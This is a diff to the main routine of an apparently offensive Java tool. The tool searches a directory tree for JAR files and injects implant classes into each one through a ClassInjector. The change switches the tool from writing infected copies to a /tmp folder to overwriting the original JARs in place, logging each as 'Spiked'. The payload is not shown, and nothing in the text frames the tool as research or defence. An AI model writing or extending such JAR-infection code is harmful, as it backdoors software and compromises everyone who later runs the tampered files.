@@ -24,8 +24,9 @@ public class Main {
         Set<Path> jarsToImplant;
         try {
             jarsToImplant = findAllJars(LIMIT_PATH);
-        } catch (Exception ignored) {
+        } catch (Exception e) {
             System.out.println("[!] Failed to find JARs.");
+            e.printStackTrace();
             return;
         }
 
@@ -46,9 +47,8 @@ public class Main {
             ClassInjector injector = new ClassInjector(implantHandler);
 
             try {
-                Path outputJar = Path.of("/tmp/jarplant-att-out/").resolve(jarToImplant.getFileName());
-                injector.infect(jarToImplant, outputJar);
-                System.out.println("[+] " + jarToImplant + " -> " + outputJar);
+                injector.infect(jarToImplant, jarToImplant);
+                System.out.println("[+] Spiked " + jarToImplant);
             } catch (IOException e) {
                 System.out.println("[-] Failed to infect " + jarToImplant + " (" + e.getMessage() + ")");
                 e.printStackTrace();
